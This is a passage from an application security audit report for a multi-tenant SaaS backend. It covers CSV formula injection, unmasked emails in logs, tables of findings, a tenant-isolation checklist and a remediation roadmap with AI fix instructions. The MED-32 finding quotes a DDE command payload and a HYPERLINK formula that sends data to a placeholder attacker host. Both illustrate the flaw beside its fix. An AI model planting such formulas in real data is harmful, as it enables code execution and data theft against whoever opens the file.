**File:** `backend/api/opportunities.py:589-604` | **CVSS:** 5.5 | **Discovered:** 2026-03-06

Server-side sibling of MED-20. The opportunities CSV export writes cell values with no formula-prefix escaping:
```python
for row in data:
    flat_row = {}
    for k, v in row.items():
        ...
        else:
            flat_row[k] = v   # ← no =+-@ check
    writer.writerow(flat_row)
```

An opportunity whose `title` or `description` is `=cmd|'/c calc'!A1` (or `=HYPERLINK("http://attacker/"&A1)` for exfil) becomes a live formula when a finance analyst opens the export in Excel/LibreOffice. Opportunity titles are user-controlled via HIGH-6's mass-assignment path.

**Remediation:**
```python
def _csv_safe(v):
    if isinstance(v, str) and v and v[0] in ('=', '+', '-', '@', '\t', '\r'):
        return "'" + v
    return v
```

**Claude Code Fix Instructions:**
```
In backend/api/opportunities.py near line 589, add a helper _csv_safe()
as above and wrap the final else-branch assignment:
flat_row[k] = _csv_safe(v). Also apply to the str(v) branch for
dict/list values. Add a test that exports an opportunity titled
"=1+1" and asserts the CSV cell starts with a single-quote.
```

#### MED-33 — Unmasked Natural-Language Query in Athena Log
**File:** `backend/api/athena_queries.py:65` | **CVSS:** 5.3 | **Discovered:** 2026-03-06

```python
logger.info(
    "Generating Athena query",
    user_query=request.user_query,   # ← raw NL text
    ...
)
```

User natural-language questions contain emails, account IDs, cost figures — same content class as the (now-fixed) HIGH-34 chat leak, but scoped to the Athena `/generate` endpoint only, and logged at INFO on the happy path — not just on errors. `utils/pii_masking.py` already ships `mask_query_for_logging()` specifically for this.

**Claude Code Fix Instructions:**
```
In backend/api/athena_queries.py near line 65, import
mask_query_for_logging from utils.pii_masking and change
user_query=request.user_query to
user_query=mask_query_for_logging(request.user_query).
Also check lines ~138, ~178, ~255 (per the MED-28 extended-scope list)
for additional raw user_query/user_email occurrences and mask those too.
```

---

### PREVIOUSLY-IDENTIFIED MEDIUM FINDINGS (re-verified open)

#### MED-28 — Unmasked Emails in New Rate-Limit Code Paths
**Files:** `middleware/rate_limiting.py:461,485`; `api/admin/rate_limits.py:397` | **CVSS:** 5.3

```python
logger.warning(..., user_email=user_email)                    # 461
logger.warning("Per-user rate limit exceeded", user_email=...) # 485
logger.info("user_rate_limit_set", user_email=user['email'])   # admin:397
```

**Extended scope for MED-16** — full inventory of unmasked-email log sites confirmed 2026-03-06:

| File | Lines | Field |
|:-----|:------|:------|
| `middleware/rate_limiting.py` | 461, 485 | `user_email=user_email` |
| `api/admin/rate_limits.py` | 397 | `user_email=user['email']` |
| `api/analytics.py` | 49, 67, 210, 254 | `user_email=context.user_email` |
| `services/saved_views_service.py` | 124 | `created_by=context.user_email` |
| `api/saved_views.py` | 233 | `user_email=context.user_email` |
| `services/organization_service.py` | 357, 359 | `user_email=`, `added_by=` |
| `api/organizations.py` | 193, 200 | `user_email=context.user_email` |
| `api/athena_queries.py` | 68, 138, 178, 255 | `user_email=context.user_email` |
| `middleware/account_scoping.py` | 103, 231 | `user_email=` |
| `api/auth.py` | 517 | → **tracked separately as MED-30** |
| `middleware/authentication.py` | 215 | → **tracked separately as MED-31** |
| ~~`api/chat.py`~~ | — | resolved in F-33; F-33's error-handler regression (HIGH-34) resolved in F-37 |

**Remediation:** Apply `mask_email()` at every site above. Add CI tripwire:
```bash
# reject if any logger line has user_email/email/created_by/added_by
# pointing at a .email / .user_email attribute without mask_email()
grep -rnE 'logger\.(info|warning|error|debug)\(' backend/ \
  | grep -E '(user_email|[^_]email|created_by|added_by)\s*=' \
  | grep -v 'mask_email(' \
  && exit 1 || exit 0
```

#### MED-29 — Unvalidated Role String in Rate-Limit Admin API
**File:** `api/admin/rate_limits.py:33` | **CVSS:** 5.0

```python
role: str = Field(..., description="User role: owner, admin, or member")
```
Accepts any string. **Fix:** `Literal['owner', 'admin', 'member']`.

---

### Middleware & Configuration

| ID | Title | File | Remediation |
|:---|:------|:-----|:------------|
| MED-1 | Account scoping fails open | `middleware/account_scoping.py:111-122` | Change to fail-closed |
| MED-7 | Default SSL mode unverified | `services/database.py:67-77` | Default to `verify-full` |
| MED-8 | Production sourcemaps exposed | `frontend/vite.config.ts:24` | `sourcemap: false` or `'hidden'` |
| MED-11 | Stack traces in dev mode | `main.py:240-252` | Enforce `ENVIRONMENT=production` in all deployed envs |
| MED-21 | CORS includes localhost in prod | `ecs-services.yaml:158-162` | Remove localhost origins from production config |
| MED-22 | 7-day log retention | `ecs-services.yaml:90,96` | 90+ days for SOC 2/HIPAA |
| MED-23 | WAF removed | `main-stack.yaml:495` | Reinstate AWS WAF |

### Authentication & Authorization

| ID | Title | File | Remediation |
|:---|:------|:-----|:------------|
| MED-2 | Unauthenticated `/metrics` | `main.py:278-281` | Add auth or restrict to internal network |
| MED-4 | Weak password policy | `api/auth.py:42` | `min_length=8`, complexity regex, `max_length=128` |
| MED-6 | No rate limit on `/validate` | `api/auth.py` | Rate-limit to prevent token enumeration |
| MED-15 | Enumeration via "Account is disabled" | `api/auth.py:204-209` | Return identical "Invalid email or password" |
| MED-17 | Salt reused in hash migration | `api/auth.py:246-250` | `generate_salt()` during migration |
| MED-18 | JWT `is_admin` not re-verified | `middleware/authentication.py:224-230` | Re-check admin on sensitive ops |
| MED-25 | Auto-create user on first login | `services/rbac_service.py:260-285` | Require explicit provisioning (per-tenant configurable) |

### Data & Injection

| ID | Title | File | Remediation |
|:---|:------|:-----|:------------|
| MED-3 | LLM response preview still logged | `services/text_to_sql_service.py:661` | Remove preview or add PII scrubbing |
| MED-9 | Unvalidated cron expression | `services/scheduled_report_service.py:380` | Validate against safe patterns |
| MED-10 | Internal error details in chat response | `agents/multi_agent_workflow.py` | Sanitize agent errors before returning |
| MED-14 | No validation in cost aggregation | `services/multi_account_service.py:166-205` | Validate account IDs and date ranges |
| MED-16 | Inconsistent PII masking | Multiple files | See MED-28 inventory |
| MED-20 | CSV injection in frontend export | `frontend/src/utils/exportUtils.ts:90-99` | Prefix `= + - @` with `'` |

### Race Conditions & Resource Management

| ID | Title | File | Remediation |
|:---|:------|:-----|:------------|
| MED-12 | Race in org member management | `services/organization_service.py:286-367` | `FOR UPDATE` or serializable |
| MED-13 | TOCTOU in org member removal | `services/organization_service.py:369-436` | Atomic operations |
| MED-19 | Unbounded memory in rate limiter | `middleware/rate_limiting.py:49-50` | Periodic cleanup or Valkey TTL |
| MED-24 | Unbounded RBAC permission cache | `services/rbac_service.py:25-78` | TTL eviction + max entries |
| MED-26 | Singleton with mutable org ID | `services/opportunities_service.py:999-1012` | Request-scoped instances |
| MED-27 | DB connection leak on exception | `services/opportunities_service.py:261-474` | `try/finally` or context manager |

---

## 6 — Low Vulnerabilities (14 Open)

| ID | Title | File | Remediation |
|:---|:------|:-----|:------------|
| LOW-1 | Weak default passwords in docker-compose | `docker-compose.yml:10,30,55,58` | Strong random defaults or require env vars |
| LOW-2 | Unbounded audit query params | `api/phase3_enterprise.py:390-423` | `max_hours=720`, `max_limit=10000` |
| LOW-3 | Short hash in PII masking (32 bits) | `utils/pii_masking.py:74-76` | 16+ hex chars (64+ bits entropy) |
| LOW-4 | Organization slug collision | `services/organization_service.py:68-80` | Retry with random suffix |
| LOW-5 | Default DB credentials in settings | `config/settings.py:136-139` | Production validation for DB password |
| LOW-6 | HSTS disabled by default | `config/settings.py:68-72` | Change default to `True` |
| LOW-7 | Missing JWT audience claim | `utils/auth.py:158-173` | Add `aud`, validate on decode |
| LOW-8 | No refresh token rotation | `api/auth.py:327-412` | Issue new refresh token on each refresh |
| LOW-9 | Insecure default key accepted | `utils/auth.py:121-132` | Raise instead of warn |
| LOW-10 | Permission names in error messages | `services/rbac_service.py:208-252` | Generic "Permission denied" |
| LOW-11 | Redundant `is_admin` vs RBAC | `alembic/versions/008_*.py:39` | Deprecate in favor of RBAC roles |
| LOW-12 | Nginx server version disclosure | `frontend/nginx.conf` | `server_tokens off;` |
| LOW-13 | Empty SECRET_KEY default | `docker-compose.yml:59` | Require or fail startup |
| **LOW-14** | **Unmasked recipient list in email service stub** | **`services/email_service.py:40`** | **`recipients=[mask_email(r) for r in to]`** — fix now before real SMTP lands |

---

## 7 — SaaS Multi-Tenant Security Checklist

This is a SaaS platform serving multiple client organizations. All configurations must be tenant-aware.

| Area | Current State | Required State | Priority |
|:-----|:-------------|:---------------|:--------:|
| Database Row-Level Security | Partial — many tables lack `organization_id` | ALL tables must have `organization_id` NOT NULL with FK | P0 |
| API Route Scoping | Inconsistent — opportunities API unscoped | ALL data endpoints filter by `context.organization_id` | P0 |
| AWS Account Isolation | Partial — analytics unscoped | Cost Explorer queries filtered by org's allowed accounts | P0 |
| Conversation Isolation | API layer enforced (F-33); service layer open (HIGH-14) | Scoped to user + org at service layer | P1 |
| Rate Limits | Global in-memory; per-user layer **working (F-38)** — still single-instance (HIGH-7) | Per-organization configurable limits in Valkey (distributed) | P1 |
| Secret Key | Single key for all tenants | Consider per-tenant JWT signing keys | P2 |
| RBAC Roles | Global | Per-organization custom roles (`org_id` on roles table) | P2 |
| Reports | Auth + org-scope contract in place (F-35) | Enforce at service layer once implemented | P1 |
| Audit Logs | `organization_id` nullable | NOT NULL for all entries | P1 |
| Cache Keys | Global namespace | `org:{org_id}:` prefix | P2 |
| Field Encryption | **Provisioned (F-39)** — secret in Secrets Manager, execution-role IAM grant, both ECS artifacts wired | Key rotation schedule (90-day), per-tenant DEKs | P2 |
| Log PII Policy | Endemic unmasked email (MED-16/28/30/31/33) | Per-tenant log-retention + CI tripwire blocking unmasked PII (see F-37 AST tripwire for template) | **P0** |

---

## 8 — Prioritized Remediation Roadmap

### Phase 1 — Immediate (Do Now)

| # | Action | Issues Resolved |
|:--|:-------|:---------------|
| 1 | Add auth to opportunities endpoints | HIGH-20 |

### Phase 2 — Within 2 Weeks

| # | Action | Issues Resolved |
|:--|:-------|:---------------|
| 1 | PII log sweep (CI tripwire + mask all sites in MED-28 inventory) | MED-16, MED-28, MED-30, MED-31, MED-33, LOW-14 |
| 2 | Tenant isolation across all services | HIGH-14, HIGH-15, HIGH-16, HIGH-17, HIGH-28 |
| 3 | Dynamic SQL column-name allowlist | HIGH-9 |
| 4 | Container security (non-root users) | HIGH-21, HIGH-22 |
| 5 | Nginx hardening | HIGH-23, LOW-12 |
| 6 | Infra hardening (Valkey TLS, IAM scope, port binding) | HIGH-24, HIGH-25, HIGH-26 |
| 7 | CSV formula injection (backend + frontend) | MED-20, MED-32 |

### Phase 3 — Within 1 Month

| # | Action | Issues Resolved |
|:--|:-------|:---------------|
| 1 | Distributed rate limiting (Valkey backend) | HIGH-7, HIGH-12, MED-19 |
| 2 | Password policy strengthening | MED-4, HIGH-13 |
| 3 | Race-condition hardening | HIGH-4, HIGH-5, HIGH-10, HIGH-11 |
| 4 | Infra compliance (log retention, WAF) | MED-22, MED-23 |
| 5 | Admin-API input validation | MED-29, HIGH-18 |

### Phase 4 — Ongoing

| # | Action | Issues Resolved |
|:--|:-------|:---------------|
| 1 | All LOW findings | LOW-1 → LOW-14 |
| 2 | Refresh-token rotation | LOW-8 |
| 3 | JWT audience claims | LOW-7 |
| 4 | RBAC cleanup | LOW-11 |

---

## Appendix A — Fixed Issues

All historically fixed vulnerabilities are tracked in [`FIXED_SECURITY_ISSUES.md`](./FIXED_SECURITY_ISSUES.md).

**42 fixed · 7 fixed this cycle (CRIT-12 → F-36, HIGH-34 → F-37, HIGH-32 → F-38, HIGH-33 → F-39, HIGH-1 → F-40, HIGH-8 → F-41, HIGH-3 → F-42) · 1 regression discovered & closed same cycle (HIGH-34 ← F-33 → F-37) · 1 closed as not-applicable by verification (HIGH-3).**

---

*Report generated: 2026-03-06 | Next audit recommended: 2026-04-06*
*Total tracked: 73 open + 42 fixed = 115 vulnerabilities across 5 audit cycles*
